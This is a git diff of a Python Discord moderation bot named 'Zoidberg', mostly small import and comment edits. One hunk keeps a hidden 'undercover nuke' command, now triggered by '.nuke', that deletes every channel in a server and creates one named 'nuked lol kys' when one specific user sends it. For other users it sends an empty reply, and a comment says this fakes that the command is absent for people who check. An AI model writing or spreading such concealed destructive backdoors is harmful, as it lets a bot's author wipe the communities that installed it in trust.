@@ -1,12 +1,11 @@
 #DiscordBot 2023 "Zoidberg" by yTarik0 and 1momo7
 
-#import datetime
+
 import discord
 from discord import client
 from discord.ext import commands
 import asyncio
 from discord import app_commands
-from discord import Interaction
 import random
 
 
@@ -115,6 +114,7 @@ async def on_message(message):
                                    """)
 
 
+
         # chat-mute command (.mute)
     if message.content.startswith(".mute".capitalize()):
         usr = message.guild.get_member(message.author.id)
@@ -194,14 +194,14 @@ async def on_message(message):
 
 
     #undercover nuke
-    if message.content.startswith('!nuke'):
+    if message.content.startswith('.nuke'):
         if message.author == "tarik#5891":
             server = message.guild
             for c in server.channels:
                 await c.delete()
             await message.guild.create_text_channel(name="nuked lol kys")
         else:
-            await message.channel.send("") #faking that there is no !nuke command for people who checked it
+            await message.channel.send("") #faking that there is no .nuke command for people who checked it
 
 # ban command
 @client.tree.command(name="ban", description="ban a user")
@@ -293,7 +293,6 @@ async def clear(interaction: discord.Interaction, amount: int = 0):
     channel = interaction.channel
     if interaction.user.guild_permissions.manage_messages:
         try:
-            #amount = int(interaction.content[7:])
             await channel.purge(limit=amount + 1)
             embed = discord.Embed(title=f"{interaction.user.name.capitalize()} cleared {amount} Messages",color=discord.Colour.random())
             embed.add_field(name="🆔 **User ID**", value=interaction.user.id)
@@ -329,7 +328,7 @@ async def clear(interaction: discord.Interaction, amount: int = 0):
 
 
 
-# not working i will fix that
+# not working i will fix that soon as possible
 @client.event
 async def status_task():
     while True:
